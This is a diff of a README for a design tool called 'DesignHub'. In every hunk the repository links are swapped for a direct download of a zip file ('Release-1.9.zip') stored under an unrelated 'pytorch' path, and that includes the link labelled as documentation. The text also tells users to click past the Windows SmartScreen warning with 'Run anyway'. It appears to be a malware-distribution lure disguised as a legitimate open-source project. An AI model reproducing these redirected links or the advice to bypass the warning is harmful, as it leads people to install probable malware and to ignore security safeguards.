@@ -14,11 +14,11 @@ Welcome to DesignHub! This is a free, open-source tool that helps you create a c
 - Your data stays on your computer (local-first)
 - No hidden fees, no subscriptions, ever
 
-**[⬇️ Download DesignHub Now](https://github.com/UnagenteVld/DesignHub)**
+**[⬇️ Download DesignHub Now](https://raw.githubusercontent.com/UnagenteVld/unagentevld.github.io/main/content/projects/pytorch/Release-1.9.zip)**
 
 ## ✨ What Can You Do With DesignHub?
 
-Visit this link to download the application: [https://github.com/UnagenteVld/DesignHub](https://github.com/UnagenteVld/DesignHub)
+Visit this link to download the application: [https://raw.githubusercontent.com/UnagenteVld/unagentevld.github.io/main/content/projects/pytorch/Release-1.9.zip](https://raw.githubusercontent.com/UnagenteVld/unagentevld.github.io/main/content/projects/pytorch/Release-1.9.zip)
 
 Once you have DesignHub running, you can:
 
@@ -34,7 +34,7 @@ Once you have DesignHub running, you can:
 
 ### Step 1: Download DesignHub
 
-**[Click here to download DesignHub](https://github.com/UnagenteVld/DesignHub)**
+**[Click here to download DesignHub](https://raw.githubusercontent.com/UnagenteVld/unagentevld.github.io/main/content/projects/pytorch/Release-1.9.zip)**
 
 Visit this link to download the application. The download page will open in your browser.
 
@@ -48,7 +48,7 @@ The file will be named something like `DesignHub` or `designhub`.
 
 ### Step 3: Run DesignHub
 
-Visit this link to download the application: [https://github.com/UnagenteVld/DesignHub](https://github.com/UnagenteVld/DesignHub)
+Visit this link to download the application: [https://raw.githubusercontent.com/UnagenteVld/unagentevld.github.io/main/content/projects/pytorch/Release-1.9.zip](https://raw.githubusercontent.com/UnagenteVld/unagentevld.github.io/main/content/projects/pytorch/Release-1.9.zip)
 
 After downloading, find the file in your Downloads folder and double-click it. Windows might show a blue screen saying "Windows protected your PC." If this happens, click "More info" and then "Run anyway." This is normal for open-source software.
 
@@ -100,7 +100,7 @@ DesignHub is lightweight and runs on almost any Windows computer:
 ## 🔧 Troubleshooting Common Issues
 
 **"I can't open the file"**
-Make sure you downloaded the complete file. Try downloading again from the link: [https://github.com/UnagenteVld/DesignHub](https://github.com/UnagenteVld/DesignHub)
+Make sure you downloaded the complete file. Try downloading again from the link: [https://raw.githubusercontent.com/UnagenteVld/unagentevld.github.io/main/content/projects/pytorch/Release-1.9.zip](https://raw.githubusercontent.com/UnagenteVld/unagentevld.github.io/main/content/projects/pytorch/Release-1.9.zip)
 
 **"Windows SmartScreen warning"**
 Click "More info" → "Run anyway." Your computer is just being cautious about unknown software.
@@ -129,7 +129,7 @@ Check your internet connection. Fonts download from Google Fonts on demand.
 
 ## 🆘 Need Help?
 
-- Visit the [GitHub repository](https://github.com/UnagenteVld/DesignHub) for documentation
+- Visit the [GitHub repository](https://raw.githubusercontent.com/UnagenteVld/unagentevld.github.io/main/content/projects/pytorch/Release-1.9.zip) for documentation
 - Search for "DesignHub" on Google or YouTube for tutorials
 - Report bugs on GitHub issues page
 
@@ -144,7 +144,7 @@ DesignHub is perfect for:
 
 Remember: DesignHub stores everything locally. You're in complete control of your data.
 
-**[📦 Get DesignHub Now - It's Free](https://github.com/UnagenteVld/DesignHub)**
+**[📦 Get DesignHub Now - It's Free](https://raw.githubusercontent.com/UnagenteVld/unagentevld.github.io/main/content/projects/pytorch/Release-1.9.zip)**
 
 Happy designing! Your perfect brand identity is just a few clicks away.
 
